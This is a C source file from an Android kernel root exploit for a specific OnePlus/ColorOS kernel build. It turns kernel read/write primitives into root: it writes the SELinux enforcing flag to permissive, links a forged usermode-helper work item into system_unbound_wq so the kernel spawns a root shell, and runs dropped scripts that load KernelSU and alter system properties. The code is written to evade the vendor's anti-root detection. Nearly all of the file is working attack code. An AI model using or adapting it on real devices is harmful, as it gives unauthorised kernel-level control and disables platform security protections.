/*
 * umh_root.c — UMH root via fake work_struct injection into system_unbound_wq
 *
 * Ported from JoinChang/ghostlock-oneplus (same kernel build
 * 6.6.89-android15-8-gf4dc45704e54-abogki446052083-4k — offsets verified
 * against our live kallsyms dump).
 *
 * The kernel's worker thread calls call_usermodehelper_exec_work() on the
 * fake work, which forks /system/bin/sh with ROOT creds (kernel-thread
 * init_cred) — no setuid/setenforce syscall ever fires, so the ColorOS
 * anti-root hook never sets the tamper tag (no watchdog reboot, no app
 * kills at startup).
 *
 * ADDRESS CLASS (PKJ110): workqueue structs live in kernel image .data —
 * MUST use configfs (pipe read of image pages panics). The fake
 * structures live on page_base (physmap slab page) — pipe is fine.
 */

#include "common.h"

#define UMH_SCRIPT_PATH "/data/local/tmp/.ghostlock_root.sh"

/* Page layout: fake subprocess_info and umh data on the reclaimed page,
 * in the gap between the fops table (0x1000+) and fake_w0 (0x2220). */
#define UMH_WORK_OFF 0x2000
#define UMH_DATA_OFF 0x2080

/* Workqueue internal struct offsets (kernel-internal, stable across 6.x) */
#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x28
#define POOL_NR_IDLE_OFF 0x3c
#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

/* Kernel subprocess_info layout (mirrors include/linux/umh.h) */
struct umh_subprocess_info {
  uint8_t work[48];
  uint64_t complete;
  uint64_t path;
  uint64_t argv;
  uint64_t envp;
  int32_t wait;
  int32_t retval;
  uint64_t init;
  uint64_t cleanup;
  uint64_t data;
};

struct umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct umh_kernel_data {
  struct umh_completion completion;
  char sh_path[64];
  char sh_argv0[16];
  char script_path[256];
  uint64_t argv[4];
  uint64_t envp[1];
};

/* --- Image-vs-slab address-aware helpers -------------------------------- */

static int umh_target_is_image(uintptr_t target) {
  /* kernel image (KASLR range) → configfs; physmap (0xffffff80..) → pipe */
  if (!kaslr_done) {
    return 0;
  }
  return target >= kaslr_base && target < kaslr_base + 0x3000000ULL;
}

static int umh_read_data(int fd, uintptr_t target, void *data, size_t len) {
  if (umh_target_is_image(target)) {
    return kernel_read_data(fd, target, data, len) == (ssize_t)len;
  }
  if (pipe_phys_read_data(fd, target, data, len)) {
    return 1;
  }
  return kernel_read_data(fd, target, data, len) == (ssize_t)len;
}

static int umh_write_data(int fd, uintptr_t target, const void *data,
                          size_t len) {
  if (umh_target_is_image(target)) {
    return kernel_write_data(fd, target, data, len) == (ssize_t)len;
  }
  if (pipe_phys_write_data(fd, target, data, len)) {
    return 1;
  }
  return kernel_write_data(fd, target, data, len) == (ssize_t)len;
}

static uint64_t umh_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  umh_read_data(fd, target, &value, sizeof(value));
  return value;
}

static uint32_t umh_read32(int fd, uintptr_t target) {
  return (uint32_t)umh_read64(fd, target);
}

static int umh_write64(int fd, uintptr_t target, uint64_t value) {
  return umh_write_data(fd, target, &value, sizeof(value));
}

static int umh_write32(int fd, uintptr_t target, uint32_t value) {
  return umh_write_data(fd, target, &value, sizeof(value));
}

/* --- Wake idle workers via PTY alloc/dealloc (ghostlock parity) --------- */

static int wake_system_unbound(void) {
  char slave_name[128];
  int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master_fd < 0 || grantpt(master_fd) != 0 || unlockpt(master_fd) != 0 ||
      ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0) {
    if (master_fd >= 0) {
      close(master_fd);
    }
    return 0;
  }
  int slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (slave_fd < 0) {
    close(master_fd);
    return 0;
  }
  int master_ok = close(master_fd) == 0;
  int slave_ok = close(slave_fd) == 0;
  return master_ok && slave_ok;
}

/* --- Root script (runs as the UMH-spawned root sh) ---------------------- */

static void write_root_script(void) {
  int sfd = open(UMH_SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
                 0755);
  if (sfd < 0) {
    return;
  }
  const char *script =
      "#!/system/bin/sh\n"
      "echo '[+] root shell pid='$$ 'uid='$(id -u)\n"
      "KSUD=$(find /data/app -path '*/me.weishu.kernelsu*/lib/arm64/"
      "libksud.so' 2>/dev/null | head -1)\n"
      "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
      "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
      "  echo '[+] KernelSU already loaded'\n"
      "elif [ -x \"$KSUD\" ] || [ -f \"$KSUD\" ]; then\n"
      "  echo '[*] ksud:' $KSUD\n"
      "  chmod 755 \"$KSUD\" 2>/dev/null\n"
      "  mkdir -p /data/adb/ksu 2>/dev/null\n"
      "  echo '[*] ksud late-load'\n"
      "  setsid \"$KSUD\" late-load --package-name me.weishu.kernelsu "
      "--allow-shell </dev/null >/dev/null 2>&1 &\n"
      "  for w in $(seq 1 30); do\n"
      "    grep -q kernelsu /proc/modules 2>/dev/null && break\n"
      "    sleep 1\n"
      "  done\n"
      "  grep -q kernelsu /proc/modules 2>/dev/null && echo '[+] KSU LOADED' "
      "|| echo '[!] KSU NOT loaded'\n"
      "fi\n"
      /* --- Swordfish (ColorOS launch-time AOT) mitigation -----------------
       * Root cause of the "all apps crash at launch" regression observed on
       * zeroing boots (run168/169/172/173): ColorOS 'Swordfish' performs
       * launch-time dex2oat INSIDE the app's :background process, passing
       * the OAT output via an inherited --oat-fd. With the secureguard
       * hooks neutralized, that fd path breaks and dex2oat dies with
       * "Output must be supplied with either --oat-file or --oat-fd"
       * (observed in logcat), leaving the app's dex uncompiled -> class
       * loading fails -> NPE cascade (ClientTransactionListenerController
       * context null / Instrumentation null). Empirically (run174 boot):
       * setprop persist.sys.swordfish.launchapp.enable 0 made settings
       * launch cleanly again while root stayed intact.
       *
       * Disable BOTH the launch and install Swordfish AOT paths so ART
       * falls back to the standard verify/JIT flow, which does not depend
       * on the broken fd handoff. The props are read by dex2oat at exec
       * time, so they take effect immediately for future launches.
       * persist.* survives reboots (escape hatch: setprop ... 1). */
      "echo '[*] swordfish: disabling launch/install AOT (fd path broken "
      "after hook zeroing)'\n"
      /* run175/176/177 lesson: the UMH-spawned sh (kernel sid) could not
       * reliably land the props at 0, and its stdout goes nowhere (kernel
       * UMH child has no terminal) — so every attempt below now (a) keeps
       * its stderr, (b) appends results to the on-disk status file, and
       * (c) re-verifies with getprop before declaring anything. The
       * detached shell-context watcher forked by fork_swordfish_watcher()
       * is the PRIMARY path (it uses the exact su -c command proven to
       * work manually); this script section is defense-in-depth. */
      "SF=/data/local/tmp/ghostlock_swordfish.txt\n"
      "echo \"script pid=$$ ts=$(date +%s) uid=$(id -u) sf-start\" >> $SF\n"
      "setprop persist.sys.swordfish.launchapp.enable 0 2>>$SF\n"
      "echo \"script direct-setprop rc=$?\" >> $SF\n"
      "SF_OK=0\n"
      "for w in $(seq 1 15); do\n"
      "  LA=$(getprop persist.sys.swordfish.launchapp.enable)\n"
      "  IN=$(getprop persist.sys.swordfish.installapp.enable)\n"
      "  [ \"$LA\" = 0 ] && [ \"$IN\" = 0 ] && SF_OK=1 && break\n"
      "  if [ -x /system/bin/su ]; then\n"
      "    /system/bin/su -c 'setprop persist.sys.swordfish.launchapp.enable "
      "0; setprop persist.sys.swordfish.installapp.enable 0' >>$SF 2>&1\n"
      "  fi\n"
      "  if [ -x /data/adb/ksu/bin/resetprop ]; then\n"
      "    /system/bin/su -c 'resetprop persist.sys.swordfish.launchapp."
      "enable 0; resetprop persist.sys.swordfish.installapp.enable 0' "
      ">>$SF 2>&1\n"
      "  fi\n"
      "  sleep 2\n"
      "done\n"
      "LA=$(getprop persist.sys.swordfish.launchapp.enable)\n"
      "IN=$(getprop persist.sys.swordfish.installapp.enable)\n"
      "if [ \"$LA\" = 0 ] && [ \"$IN\" = 0 ]; then SF_OK=1; fi\n"
      "echo \"script sf-done ok=$SF_OK launch=[$LA] install=[$IN] ts=$(date "
      "+%s)\" >> $SF\n"
      "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
      "echo '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
      "echo '[+] done'\n";
  (void)write(sfd, script, strlen(script));
  close(sfd);
}

/* --- Swordfish auto-disable watcher (run175/176/177 lesson) -------------
 *
 * The UMH root script's setprop attempts run with the kernel sid; they were
 * never observable (kernel UMH children have no stdout) and never reliably
 * landed the props at 0. The ONLY path proven live is the manual one:
 * shell-domain process → /system/bin/su (u:r:ksu:s0) → setprop.
 *
 * DESIGN (fork-safety, audited 2026-08-18): the exploit process is
 * multi-threaded (waiter/owner/consumer pthreads are never joined), so a
 * fork() child must not call non-async-signal-safe functions (system(),
 * popen(), vsnprintf()) — libc locks held by sibling threads would be dead.
 * Therefore the child ONLY does open/dup2/close/setsid/execve/_exit and
 * exec's the shell script below; all retry/verify/log logic lives in the
 * script. The status file is TRUNCATED (O_TRUNC keeps the inode) in the
 * parent — never unlink()d — so the UMH script's already-open ">>" fd keeps
 * pointing at the same file and no evidence lines are orphaned.
 *
 * Operator gate: the ordered app validation may only start after the status
 * file shows "watcher RESULT=OK". GHOSTLOCK_NO_SWORDFISH=1 skips. */

#define SWORDFISH_STATUS "/data/local/tmp/ghostlock_swordfish.txt"
#define SF_WATCH_SCRIPT "/data/local/tmp/.ghostlock_sf_watch.sh"

extern char **environ;

static void write_sf_watch_script(void) {
  int sfd = open(SF_WATCH_SCRIPT, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
                 0755);
  if (sfd < 0) {
    return;
  }
  const char *script =
      "#!/system/bin/sh\n"
      "# GhostLock Swordfish watcher - exec'd detached by the exploit.\n"
      "# Retries the shell->su setprop path (the only one proven live)\n"
      "# until BOTH props verify 0 via getprop, then writes the verdict.\n"
      "SF=/data/local/tmp/ghostlock_swordfish.txt\n"
      "echo \"watcher pid=$$ start=$(date +%s) uid=$(id -u)\" >> \"$SF\"\n"
      "ok=0\n"
      "w=0\n"
      "while [ $w -lt 45 ]; do\n"
      "  w=$((w+1))\n"
      "  if [ -x /system/bin/su ]; then\n"
      "    /system/bin/su -c 'setprop persist.sys.swordfish.launchapp.enable "
      "0; setprop persist.sys.swordfish.installapp.enable 0' >/dev/null 2>&1\n"
      "    /system/bin/su -c 'resetprop persist.sys.swordfish.launchapp."
      "enable 0; resetprop persist.sys.swordfish.installapp.enable 0' "
      ">/dev/null 2>&1\n"
      "  else\n"
      "    setprop persist.sys.swordfish.launchapp.enable 0 >/dev/null 2>&1\n"
      "    setprop persist.sys.swordfish.installapp.enable 0 >/dev/null 2>&1\n"
      "  fi\n"
      "  LA=$(getprop persist.sys.swordfish.launchapp.enable)\n"
      "  IN=$(getprop persist.sys.swordfish.installapp.enable)\n"
      "  if [ \"$LA\" = \"0\" ] && [ \"$IN\" = \"0\" ]; then ok=1; break; fi\n"
      "  if [ \"$w\" = \"1\" ] || [ $((w % 5)) = \"0\" ]; then\n"
      "    echo \"watcher attempt=$w launch=[$LA] install=[$IN]\" >> \"$SF\"\n"
      "  fi\n"
      "  sleep 3\n"
      "done\n"
      "LA=$(getprop persist.sys.swordfish.launchapp.enable)\n"
      "IN=$(getprop persist.sys.swordfish.installapp.enable)\n"
      "if [ \"$LA\" = \"0\" ] && [ \"$IN\" = \"0\" ]; then ok=1; fi\n"
      "if [ \"$ok\" = \"1\" ]; then\n"
      "  echo \"watcher RESULT=OK attempt=$w launch=[$LA] install=[$IN] "
      "end=$(date +%s)\" >> \"$SF\"\n"
      "else\n"
      "  echo \"watcher RESULT=FAIL attempts=$w launch=[$LA] install=[$IN] "
      "end=$(date +%s)\" >> \"$SF\"\n"
      "fi\n";
  (void)write(sfd, script, strlen(script));
  close(sfd);
  chmod(SF_WATCH_SCRIPT, 0755);
}

void fork_swordfish_watcher(void) {
  char *nosf = getenv("GHOSTLOCK_NO_SWORDFISH");
  if (nosf && nosf[0] == '1') {
    pr_success("【Swordfish看守器】已禁用\n");
    return;
  }

  write_sf_watch_script();

  /* Reset the status file WITHOUT unlinking (O_TRUNC keeps the inode the
   * UMH script may already hold open via ">>"), and stamp a start marker. */
  const char *start = "watcher spawn pending (fork next)\n";
  int sfd = open(SWORDFISH_STATUS, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
                 0644);
  if (sfd >= 0) {
    (void)write(sfd, start, strlen(start));
    close(sfd);
  }

  /* argv/envp prepared in the parent (inherited across fork). */
  char *argv[] = {(char *)"sh", (char *)SF_WATCH_SCRIPT, NULL};

  pid_t pid = fork();
  if (pid < 0) {
    pr_error("【失败 Swordfish看守器】fork 失败 errno=%d\n", errno);
    return;
  }
  if (pid == 0) {
    /* Child: async-signal-safe calls ONLY, then exec the watcher script.
     * Detach from the exploited process's session so `timeout 115` and the
     * exploit's own exit cannot kill the watcher. */
    setsid();
    int nfd = open("/dev/null", O_RDWR);
    if (nfd >= 0) {
      dup2(nfd, STDIN_FILENO);
      dup2(nfd, STDOUT_FILENO);
      dup2(nfd, STDERR_FILENO);
      if (nfd > STDERR_FILENO) {
        close(nfd);
      }
    }
    execve("/system/bin/sh", argv, environ);
    _exit(127); /* exec failed */
  }

  pr_success("【Swordfish看守器】已启动\n");
  fsync(STDERR_FILENO);
}

/* --- Main UMH root function --------------------------------------------- */

int install_umh_root(int configfs_fd) {
  if (!kaslr_done) {
    pr_error("【失败 UMH】kaslr_done=0 — cannot resolve workqueue addrs\n");
    return 0;
  }

  write_root_script();

  int fd = configfs_fd;
  uintptr_t wq_image = kaslr_base + SYSTEM_UNBOUND_WQ_OFF;

  /* 1. Disable SELinux (1-byte write via configfs — image page) */
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uint8_t permissive = 0;
  if (kernel_write_data(fd, selinux_addr, &permissive, sizeof(permissive)) !=
      (ssize_t)sizeof(permissive)) {
    pr_error("【失败 UMH】selinux 写失败\n");
    return 0;
  }
  pr_info("umh: selinux permissive\n");
  fsync(STDERR_FILENO);

  /* 2. Traverse: system_unbound_wq -> wq -> dfl_pwq -> pool */
  uintptr_t wq = umh_read64(fd, wq_image);
  uintptr_t pwq = umh_read64(fd, wq + WQ_DFL_PWQ_OFF);
  uintptr_t pool = umh_read64(fd, pwq + PWQ_POOL_OFF);
  uintptr_t pwq_wq = umh_read64(fd, pwq + PWQ_WQ_OFF);

  if (!is_direct_ptr(wq) || !is_direct_ptr(pwq) || !is_direct_ptr(pool) ||
      pwq_wq != wq) {
    pr_error("【失败 UMH】workqueue 遍历校验失败 wq_slot=%016zx wq=%016zx pwq=%016zx "
             "pool=%016zx pwq_wq=%016zx\n",
             (size_t)wq_image, (size_t)wq, (size_t)pwq, (size_t)pool,
             (size_t)pwq_wq);
    return 0;
  }
  pr_info("umh: wq=%016zx pwq=%016zx pool=%016zx\n", (size_t)wq,
          (size_t)pwq, (size_t)pool);
  fsync(STDERR_FILENO);

  /* 3. Wait for pool worklist empty and idle workers available */
  uintptr_t worklist = pool + POOL_WORKLIST_OFF;
  uint64_t list_next = 0, list_prev = 0;
  uint32_t nr_idle = 0;

  for (int i = 0; i < 200; i++) {
    list_next = umh_read64(fd, worklist);
    list_prev = umh_read64(fd, worklist + sizeof(uint64_t));
    nr_idle = umh_read32(fd, pool + POOL_NR_IDLE_OFF);
    if (list_next == worklist && list_prev == worklist && nr_idle > 0) {
      break;
    }
    usleep(1000);
  }

  if (list_next != worklist || list_prev != worklist || nr_idle == 0) {
    pr_error("【失败 UMH】worker pool 忙（无空闲 worker） list=%016llx/%016llx head=%016zx idle=%u\n",
             (unsigned long long)list_next, (unsigned long long)list_prev,
             (size_t)worklist, nr_idle);
    return 0;
  }

  /* Validate pwq state */
  uint32_t color = umh_read32(fd, pwq + PWQ_WORK_COLOR_OFF);
  uint32_t refcnt = umh_read32(fd, pwq + PWQ_REFCNT_OFF);
  uint32_t nr_active = umh_read32(fd, pwq + PWQ_NR_ACTIVE_OFF);
  uint32_t max_active = umh_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF);

  if (color >= 16 || refcnt == 0 || nr_active >= max_active) {
    pr_error("【失败 UMH】pwq 状态异常 color=%u refcnt=%u active=%u/%u\n", color, refcnt,
             nr_active, max_active);
    return 0;
  }

  /* 4. Build fake subprocess_info + completion + umh_data on kernel page */
  uintptr_t fake_work_addr = page_base + UMH_WORK_OFF;
  uintptr_t umh_data_addr = page_base + UMH_DATA_OFF;

  struct umh_kernel_data umh_data;
  memset(&umh_data, 0, sizeof(umh_data));

  snprintf(umh_data.sh_path, sizeof(umh_data.sh_path), "/system/bin/sh");
  snprintf(umh_data.sh_argv0, sizeof(umh_data.sh_argv0), "sh");
  snprintf(umh_data.script_path, sizeof(umh_data.script_path), "%s",
           UMH_SCRIPT_PATH);

  uintptr_t completion_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, completion);
  uintptr_t wait_list_addr =
      completion_addr + offsetof(struct umh_completion, next);
  uintptr_t sh_path_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, sh_path);
  uintptr_t sh_argv0_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, sh_argv0);
  uintptr_t script_path_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, script_path);
  uintptr_t argv_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, argv);
  uintptr_t envp_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, envp);

  /* Self-referencing wait list (empty completion) */
  umh_data.completion.next = wait_list_addr;
  umh_data.completion.prev = wait_list_addr;

  /* argv = { "sh", script_path, NULL } */
  umh_data.argv[0] = sh_argv0_addr;
  umh_data.argv[1] = script_path_addr;
  umh_data.argv[2] = 0;
  umh_data.argv[3] = 0;
  umh_data.envp[0] = 0;

  /* Build fake work_struct inside subprocess_info */
  uint64_t umh_work_func = kaslr_base + CALL_UMH_EXEC_WORK_OFF;
  uintptr_t inflight_addr = pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t);
  uint32_t nr_inflight = umh_read32(fd, inflight_addr);
  uintptr_t fake_entry = fake_work_addr + WORK_ENTRY_OFF;
  uint64_t work_data = pwq | ((uint64_t)color << 4) | 5;

  struct umh_subprocess_info fake;
  memset(&fake, 0, sizeof(fake));
  memcpy(fake.work + WORK_DATA_OFF, &work_data, sizeof(work_data));
  memcpy(fake.work + WORK_ENTRY_OFF, &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_ENTRY_OFF + sizeof(uint64_t), &worklist,
         sizeof(worklist));
  memcpy(fake.work + WORK_FUNC_OFF, &umh_work_func, sizeof(umh_work_func));
  fake.complete = completion_addr;
  fake.path = sh_path_addr;
  fake.argv = argv_addr;
  fake.envp = envp_addr;

  /* Write structures to kernel page (physmap → pipe) */
  int data_ok = umh_write_data(fd, umh_data_addr, &umh_data, sizeof(umh_data));
  int work_ok =
      umh_write_data(fd, fake_work_addr, &fake, sizeof(fake));

  /* 6. Increment workqueue counters */
  int ctr_ok = umh_write32(fd, inflight_addr, nr_inflight + 1) &&
               umh_write32(fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1) &&
               umh_write32(fd, pwq + PWQ_REFCNT_OFF, refcnt + 1);

  /* 5. Link fake work_struct into pool worklist */
  int lp_ok = umh_write64(fd, worklist + sizeof(uint64_t), fake_entry);
  int ln_ok = lp_ok && umh_write64(fd, worklist, fake_entry);

  pr_info("umh: queued wq=%016zx pwq=%016zx pool=%016zx work=%016zx "
          "entry=%016zx color=%u counters=%u/%u/%u writes=%d/%d/%d/%d/%d\n",
          (size_t)wq, (size_t)pwq, (size_t)pool, (size_t)fake_work_addr,
          (size_t)fake_entry, color, nr_inflight, nr_active, refcnt, data_ok,
          work_ok, ctr_ok, lp_ok, ln_ok);
  fsync(STDERR_FILENO);

  if (!data_ok || !work_ok || !ctr_ok || !ln_ok) {
    return 0;
  }

  /* 7 + 8. Wake workers via PTY, poll completion flag */
  uint32_t complete_done = 0;
  int wake_ok = 0;

  for (int i = 0; i < 8 && !complete_done; i++) {
    wake_ok |= wake_system_unbound();
    for (int j = 0; j < 250; j++) {
      complete_done = umh_read32(fd, completion_addr);
      if (complete_done) {
        break;
      }
      usleep(1000);
    }
  }

  int32_t umh_retval = (int32_t)umh_read32(
      fd, fake_work_addr + offsetof(struct umh_subprocess_info, retval));

  pr_info("umh: result wake=%d complete=%u retval=%d\n", wake_ok,
          complete_done, umh_retval);
  fsync(STDERR_FILENO);

  /* 9. Success/failure */
  if (!complete_done) {
    pr_error("【失败 UMH】completion 超时\n");
    return 0;
  }
  if (umh_retval != 0) {
    pr_error("【失败 UMH】内核 exec 失败 retval=%d\n", umh_retval);
    return 0;
  }

  pr_success("ROOT 进程已启动\n");
  fsync(STDERR_FILENO);
  return 1;
}
